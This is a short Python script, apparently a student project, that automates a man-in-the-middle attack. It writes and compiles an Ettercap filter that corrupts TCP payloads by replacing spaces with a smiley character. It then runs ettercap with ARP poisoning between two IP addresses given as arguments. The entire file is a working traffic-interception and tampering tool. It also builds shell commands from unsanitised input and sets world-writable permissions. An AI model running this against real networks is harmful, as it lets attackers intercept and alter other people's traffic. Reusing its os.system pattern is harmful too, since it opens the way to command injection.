#Developed by:
#- Matteo Di Fabio 264339
#- Luca Genovese 264364
import os
import sys

if (len(sys.argv)!=3):
  print("Pass the correct number of parameters please")
  exit(1)

#creare un file chiamato injection.filter con scritto il filtro
file_content='if(ip.proto==TCP ){\n\tif (search(DATA.data, " ")) {\n\t\treplace(" ", "☺");\n\t\tmsg("File Corrupted");\n\t}\n}'
fp=open("injection.filter","w")
fp.write(file_content)
fp.close()
z="chmod 777 injection.filter"
os.system(z)
y= "etterfilter injection.filter -o injection_compiled.ef"
os.system(y)
x = "ettercap -Tq -F injection_compiled.ef -M arp /" + sys.argv[1] +  "// /"+ sys.argv[2]+"//"
os.system(x)

